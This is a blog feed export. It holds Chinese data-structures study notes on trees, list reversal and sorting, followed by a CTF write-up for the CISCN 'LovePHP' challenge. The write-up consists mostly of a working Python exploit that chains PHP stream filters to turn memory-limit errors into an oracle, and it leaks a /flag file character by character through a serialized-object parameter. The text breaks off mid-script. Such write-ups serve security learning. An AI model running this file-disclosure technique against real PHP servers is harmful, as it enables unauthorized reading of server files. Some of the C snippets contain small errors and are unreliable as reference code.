r+1;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>  递归左右子树高度：treeDepth(T -&gt; lchild); treeDepth(T -&gt; rchild);</li></ol><h2 id="判断节点总数"><a href="#判断节点总数" class="headerlink" title="判断节点总数"></a>判断节点总数</h2><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int count &#x3D; 0;void Count(BiTree T) &#123;    if(T &#x3D;&#x3D; NULL) &#123;        return 0;    &#125;    else &#123;       count++;        Count(T-&gt;lchild);        Count(T-&gt;rchild);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>  判断节点总数，递归左右子树，并在递归左右子树之前要count++</li><li>  二叉树判断左右子树高度和统计节点总数，都要递归实现，并递归返回的条件是传入的节点为空</li></ol><h2 id="设计算法按前序次序打印二叉树中的叶子结点"><a href="#设计算法按前序次序打印二叉树中的叶子结点" class="headerlink" title="设计算法按前序次序打印二叉树中的叶子结点"></a>设计算法按前序次序打印二叉树中的叶子结点</h2><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void PrintLeaves(BiTree T) &#123;    if(T &#x3D;&#x3D; NULL) &#123;        return;    &#125;    if(T -&gt; lchild &#x3D;&#x3D; NULL &amp;&amp; T -&gt; rchild &#x3D;&#x3D; NULL) &#123; &#x2F;&#x2F;判断是否为叶子节点        printf(&quot;%d&quot;,T-&gt;data); &#x2F;&#x2F; 只打印叶子节点    &#125;    PrintLeaves(T -&gt; lchild); &#x2F;&#x2F;递归处理左子树    PrintLeaves(T -&gt; rchild); &#x2F;&#x2F;递归处理右子树&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="前序序列打印所有节点"><a href="#前序序列打印所有节点" class="headerlink" title="前序序列打印所有节点"></a>前序序列打印所有节点</h2><ol><li><p>和只打印叶子节点相比，少了一个对是否为叶子节点的判断，即</p>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">if(T -&gt; lchild &#x3D;&#x3D; NULL &amp;&amp; T -&gt; rchild &#x3D;&#x3D; NULL) &#123;&#125;if(T -&gt; lchild &#x3D;&#x3D; NULL &amp;&amp; T -&gt; rchild &#x3D;&#x3D; NULL)&#123;&#125;&#x2F;&#x2F;叶子节点有一个判断，即左右孩子是否为空if(T -&gt; lchild &#x3D;&#x3D; NULL &amp;&amp; T -&gt; rchild &#x3D;&#x3D; NULL)&#123;&#125;if(T -&gt; lchild -- NULL &amp;&amp; T -&gt; rchild &#x3D;&#x3D; NULL)&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void PrintPreorder(BiTree T) &#123;if(T &#x3D;&#x3D; NULL) &#123;        return;    &#125;    else &#123;        printf(&quot;%d&quot;,T -&gt; data);        PrintPreorder(T -&gt; lchild);        PrintPreorder(T -&gt; rchild);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="已知数组A-n-中的元素为整型，设计算法将其调整为左右两部分，左边所有元素为偶数，右边所有元素为奇数，并要求算法的时间复杂度为O-n"><a href="#已知数组A-n-中的元素为整型，设计算法将其调整为左右两部分，左边所有元素为偶数，右边所有元素为奇数，并要求算法的时间复杂度为O-n" class="headerlink" title="已知数组A[n]中的元素为整型，设计算法将其调整为左右两部分，左边所有元素为偶数，右边所有元素为奇数，并要求算法的时间复杂度为Ｏ(n)"></a>已知数组A[n]中的元素为整型，设计算法将其调整为左右两部分，左边所有元素为偶数，右边所有元素为奇数，并要求算法的时间复杂度为Ｏ(n)</h1><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void Array_reverse() &#123;int i &#x3D; 0,j &#x3D; n-1;while(i &lt; j) &#123; &#x2F;&#x2F;i是左侧，j是右侧，只有当i指针在j指针的左侧时，才继续进行交换操作while(a[i] % 2 &#x3D;&#x3D; 0) i++; &#x2F;&#x2F;a[i]满足要求，i指针后移,直到遇到一个奇数 while(a[j] % 2 !&#x3D; 0) j--; &#x2F;&#x2F;a[j]满足要求，j指针前移，直到遇到一个偶数停止 if(i &lt; j) swap(a[i],a[j]);  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>  从数组的两端向中间比较，设置两个变量i和j，初始时i=0，j=n-1，若A[i]为偶数并且A[j]为奇数，则将A[i]与A[j]交换。</li></ol><h1 id="试写出带头节点的单链表逆置算法，请写出结点结构"><a href="#试写出带头节点的单链表逆置算法，请写出结点结构" class="headerlink" title="试写出带头节点的单链表逆置算法，请写出结点结构???"></a>试写出带头节点的单链表逆置算法，请写出结点结构???</h1><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">LinkList Reverse(LinkList L) &#123;LNode *p,*r; &#x2F;&#x2F;前指针和后指针p &#x3D; L -&gt; next;L -&gt; next &#x3D; NULL;while(p !&#x3D; NULL) &#123;r &#x3D; p -&gt; next;p -&gt; next &#x3D; L -&gt; next;L -&gt; next &#x3D; p;p &#x3D; r;&#125; return L;&#125;&#x2F;&#x2F;第一步，设置前后指针&#x2F;&#x2F;第二步，p为第一个元素位置，断开头节点的下一个位置，断链&#x2F;&#x2F;第三步，判断p是否为空&#x2F;&#x2F;第四步，r指针后移&#x2F;&#x2F;第五步，p-&gt;next &#x3D; L-&gt;next;&#x2F;&#x2F;第六步，L-&gt;next &#x3D; p;&#x2F;&#x2F;第七步，p指针后移指向r&#x2F;&#x2F;zui&#39;ho<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="关键路径每次都取最大值"><a href="#关键路径每次都取最大值" class="headerlink" title="关键路径每次都取最大值"></a>关键路径每次都取最大值</h1><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230901205604.png"></p><h1 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h1><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void InsertSort(int a[],int len) &#123;    for(int j &#x3D; 1;j &lt; len;j++) &#123; &#x2F;&#x2F;外部循环，从数组的第二个位置遍历到最后一个位置，外部循环控制我们要将哪个元素插入到已经排序的子数组中        int key &#x3D; a[j];        int i &#x3D; j - 1; &#x2F;&#x2F;i从当前元素的前一个元素开始        while(i &gt;&#x3D; 0 &amp;&amp; a[i] &gt; key) &#123;            a[i+1] &#x3D; a[i];            i--;        &#125;        a[i+1] &#x3D; key;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h1><ol><li>  堆必须是一颗完全二叉树</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230901213309.png"></li><li>  在小根堆中，每个父节点都必须小于子节点元素</li><li>  在大根堆中，每个父节点都必须大于子节点元素</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230901213432.png"></li><li>  按照层序遍历的顺序来给节点编号</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230901213803.png"></li></ol><h2 id="上滤"><a href="#上滤" class="headerlink" title="上滤"></a>上滤</h2><ol><li>  当叶子节点破坏了堆序性，让他和他的父元素比较,若大于父节点则交换，直到无法上移为止，</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230901214131.png"></li></ol><h2 id="下滤"><a href="#下滤" class="headerlink" title="下滤"></a>下滤</h2><ol><li>  将破坏堆序性的元素跟他的<strong>最大</strong>的子节点比较，如果小于他的最大子节点，则交换</li><li>  持续比较，直到该元素大于他的子节点位置，或者移动到底部为止</li></ol><h2 id="总之，上滤是和父节点比较，下滤是和子节点比较，只能父子之间交换"><a href="#总之，上滤是和父节点比较，下滤是和子节点比较，只能父子之间交换" class="headerlink" title="总之，上滤是和父节点比较，下滤是和子节点比较，只能父子之间交换"></a>总之，上滤是和父节点比较，下滤是和子节点比较，只能父子之间交换</h2><h2 id="建堆"><a href="#建堆" class="headerlink" title="建堆"></a>建堆</h2><ol><li>  自顶向下建堆法</li><li>  将元素一个一个插入到堆内，将新元素放到堆的最后一位，然后对其进行上滤操作</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230901214950.png"></li></ol><h2 id="取最值调整"><a href="#取最值调整" class="headerlink" title="取最值调整"></a>取最值调整</h2><ol><li>  在大根堆中，如果父节点比两个子节点都要小，则选最大的往上走</li><li>  在小根堆中，如果父节点比两个子节点都要大，则选最小的往上走</li></ol><h2 id="排序顺序：从最后一个父节点开始往上找"><a href="#排序顺序：从最后一个父节点开始往上找" class="headerlink" title="排序顺序：从最后一个父节点开始往上找"></a>排序顺序：从最后一个父节点开始往上找</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230901221115.png"></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ciscn初赛——LovePHP题目wp</title>
      <link href="/LovePHP/"/>
      <url>/LovePHP/</url>
      
        <content type="html"><![CDATA[<h1 id="Ciscn初赛——LovePHP题目wp"><a href="#Ciscn初赛——LovePHP题目wp" class="headerlink" title="Ciscn初赛——LovePHP题目wp"></a>Ciscn初赛——LovePHP题目wp</h1><ol><li><p>  PHP特性题目</p></li><li><p>引发服务器500错误，观察PHP过滤器的行为，创建过滤器链进行攻击</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token triple-quoted-string string">"""THE GRAND IDEA:We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LEfilter will blow up the string length by 4x every time it is used, which will quickly cause500 error if and only if the string is non empty. So we now have an oracle that tells us ifthe string is empty.THE GRAND IDEA 2:The dechunk filter is interesting.https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724It looks like it was implemented for something http related, but for our purposes, the interestingbehavior is that if the string contains no newlines, it will wipe the entire string if and only ifthe string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with ourabove oracle! In fact we can verify that since the flag starts with D that the filter chaindechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LEdoes not cause a 500 error.THE REST:So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descentinto madness trying to figure out ways to:- somehow get other characters not at the start of the flag file to the front- detect more precisely which character is at the front"""</span><span class="token keyword">def</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'|'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">err</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">raise</span> ValueError<span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>param <span class="token operator">=</span> <span class="token string">'&#123;&#125;'</span>data <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>param<span class="token punctuation">&#125;</span></span><span class="token string">&amp;secret=php://filter/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>s<span class="token punctuation">&#125;</span></span><span class="token string">/resource=/flag'</span></span><span class="token keyword">return</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'http://IP+PORT/index.php?my[secret.flag=C:8:"Saferman":0:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token triple-quoted-string string">"""Step 1:The second step of our exploit only works under two conditions:- String only contains a-zA-Z0-9- String ends with two equals signsbase64-encoding the flag file twice takes care of the first condition.We don't know the length of the flag file, so we can't be sure that it will end with two equalssigns.Repeated application of the convert.quoted-printable-encode will only consume additionalmemory if the base64 ends with equals signs, so that's what we are going to use as an oracle here.If the double-base64 does not end with two equals signs, we will add junk data to the start of theflag with convert.iconv..CSISO2022KR until it does."""</span>blow_up_enc <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">[</span><span class="token string">'convert.quoted-printable-encode'</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span>blow_up_utf32 <span class="token operator">=</span> <span class="token string">'convert.iconv.L1.UCS-4LE'</span>blow_up_inf <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">[</span>blow_up_utf32<span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>header <span class="token operator">=</span> <span class="token string">'convert.base64-encode|convert.base64-encode'</span><span class="token comment"># Start get baseline blowup</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Calculating blowup'</span><span class="token punctuation">)</span>baseline_blowup <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>payload <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">[</span>blow_up_utf32<span class="token punctuation">]</span><span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>baseline_blowup <span class="token operator">=</span> n<span class="token keyword">break</span><span class="token keyword">else</span><span class="token punctuation">:</span>err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'baseline blowup is </span><span class="token interpolation"><span class="token punctuation">&#123;</span>baseline_blowup<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>trailer <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">[</span>blow_up_utf32<span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">(</span>baseline_blowup<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">assert</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>trailer<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'detecting equals'</span><span class="token punctuation">)</span>j <span class="token operator">=</span> <span class="token punctuation">[</span>req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'convert.base64-encode|convert.base64-encode|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_enc<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>trailer<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span>req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_enc<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>trailer<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span>req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_enc<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>trailer<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span><span class="token keyword">if</span> j<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>header <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode'</span></span><span class="token keyword">elif</span> j<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>header <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode'</span></span><span class="token keyword">elif</span> j<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>header <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'convert.base64-encode|convert.base64-encode'</span></span><span class="token keyword">else</span><span class="token punctuation">:</span>err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'j: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'header: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""Step two:Now we have something of the form[a-zA-Z0-9 things]==Here the pain begins. For a long time I was trying to find something that would allow me to stripsuccessive characters from the start of the string to access every character. Maybe something likethat exists but I couldn't find it. However, if you play around with filter combinations you noticethere are filters that *swap* characters:convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:abcdefgh -> badcfehgconvert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:abcdefgh -> dcbahgfeThis allows us to access the first four characters of the string. Can we do better? It turns outYES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff>&lt;0xfe> to the start ofthe string:abcdefgh -> &lt;0xff>&lt;0xfe>abcdefghThe idea being that if we now use the r4 gadget, we get something like:ba&lt;0xfe>&lt;0xff>fedcAnd then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid&lt;0xfe>&lt;0xff> to get:bafedcAnd then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6thcharacters of the string. There's only one problem: our r4 gadget requires that the string lengthis a multiple of 4. The original base64 string will be a multiple of four by definition, so whenwe apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is nogood for our r4 gadget. This is where the double equals we required in step 1 comes in! Because itturns out, if we apply the filterconvert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7It will turn the == into:+---AD0-3D3D+---AD0-3D3DAnd this is magic, because this corrects such that when we apply theconvert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!Let's recap. We have a string like:abcdefghij==Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:abcdefghij+---AD0-3D3D+---AD0-3D3DApply convert.iconv.CSUNICODE.CSUNICODE:&lt;0xff>&lt;0xfe>abcdefghij+---AD0-3D3D+---AD0-3D3DApply r4 gadget:ba&lt;0xfe>&lt;0xff>fedcjihg---+-0DAD3D3---+-0DAD3D3Apply base64-decode | base64-encode, so the '-' and high bytes will disappear:bafedcjihg+0DAD3D3+0DAD3Dw==Then apply r4 once more:efabijcd0+gh3DAD0+3D3DAD==wDAnd here's the cute part: not only have we now accessed the 5th and 6th chars of the string, butthe string still has two equals signs in it, so we can reapply the technique as many times as wewant, to access all the characters in the string ;)"""</span>flip <span class="token operator">=</span> <span class="token string">"convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode"</span>r2 <span class="token operator">=</span> <span class="token string">"convert.iconv.CSUNICODE.UCS-2BE"</span>r4 <span class="token operator">=</span> <span class="token string">"convert.iconv.UCS-4LE.10646-1:1993"</span><span class="token keyword">def</span> <span class="token function">get_nth</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">global</span> flip<span class="token punctuation">,</span> r2<span class="token punctuation">,</span> r4o <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>chunk <span class="token operator">=</span> n <span class="token operator">//</span> <span class="token number">2</span><span class="token keyword">if</span> chunk <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span> o<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r4<span class="token punctuation">)</span>o<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token punctuation">[</span>flip<span class="token punctuation">,</span> r4<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>chunk <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>chunk <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> o<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r2<span class="token punctuation">)</span><span class="token keyword">return</span> join<span class="token punctuation">(</span><span class="token operator">*</span>o<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""Step 3:This is the longest but actually easiest part. We can use dechunk oracle to figure out if the firstchar is 0-9A-Fa-f. So it's just a matter of finding filters which translate to or from thosechars. rot13 and string lower are helpful. There are probably a million ways to do this bit butI just bruteforced every combination of iconv filters to find these.Numbers are a bit trickier because iconv doesn't tend to touch them.In the CTF you coud porbably just guess from there once you have the letters. But if you actually want a full leak you can base64 encode a third time and use the first two letters of the resultingstring to figure out which number it is."""</span>rot1 <span class="token operator">=</span> <span class="token string">'convert.iconv.437.CP930'</span>be <span class="token operator">=</span> <span class="token string">'convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode'</span>o <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">def</span> <span class="token function">find_letter</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># a-f A-F 0-9</span><span class="token keyword">if</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># a-e</span><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|'</span></span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|'</span></span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'edcba'</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token keyword">break</span><span class="token keyword">else</span><span class="token punctuation">:</span>err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># A-E</span><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|'</span></span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|'</span></span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'EDCBA'</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token keyword">break</span><span class="token keyword">else</span><span class="token punctuation">:</span>err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|convert.iconv.CSISO5427CYRILLIC.855|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span 